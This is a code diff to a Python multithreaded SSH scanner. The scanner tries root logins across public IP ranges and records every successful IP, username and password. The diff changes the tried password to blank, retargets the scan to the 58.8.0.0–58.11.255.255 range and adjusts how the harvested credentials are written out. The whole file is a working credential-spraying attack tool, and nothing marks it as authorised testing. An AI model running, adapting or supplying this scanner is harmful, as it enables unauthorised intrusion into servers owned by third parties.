@@ -61,7 +61,7 @@ class Worker(threading.Thread):
             ssh_client = paramiko.SSHClient()
             ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
             ssh_client.connect(ip, port=22, username=self.username, password=self.password, timeout=15)
-            save_data("%s:%s:%s"% (ip, self.username, self.password))
+            save_data("%s:%s:%s\n"% (ip, self.username, self.password))
             ssh_client.close()
         except Exception:
             print("[ERROR] Login failed %s"% ip)
@@ -71,11 +71,11 @@ def main():
     queue = Queue()
 
     for i in range(254):
-        bot = Worker(queue, "root", "password")
+        bot = Worker(queue, "root", "")
         bot.setDaemon(True)
         bot.start()
 
-    ip_range = generate_hosts("62.24.102.1", "62.24.105.254")
+    ip_range = generate_hosts("58.8.0.0", "58.11.255.255")
 
     for ip in ip_range:
         queue.put(ip)
